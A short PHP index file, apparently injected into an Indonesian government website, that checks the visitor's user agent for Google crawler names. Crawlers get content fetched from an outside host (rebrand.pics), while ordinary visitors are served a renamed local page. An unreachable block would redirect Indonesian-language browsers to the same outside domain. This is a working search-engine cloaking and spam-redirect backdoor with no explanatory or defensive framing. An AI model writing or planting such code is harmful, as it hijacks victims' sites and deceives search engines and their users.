<?php
function is_google_bot() {
    $agents = array("Googlebot", "Google-Site-Verification", "Google-InspectionTool", "Googlebot-Mobile", "Googlebot-News");
    foreach ($agents as $agent) {
        if (strpos($_SERVER['HTTP_USER_AGENT'], $agent) !== false) return true;
    }
    return false;
}

if (is_google_bot()) {
    $bot_content = file_get_contents('https://rebrand.pics/whm/link/jdih.lemhannas.go.id.html');
    echo $bot_content;
    exit;
} else {
    include('indexx.php');
    exit;
}
$browserLang = substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0, 2);
if ($browserLang == 'id') {
    header("Location: https://rebrand.pics/site-amp/jdih.lemhannas.go.id/");
    exit;
}
?>
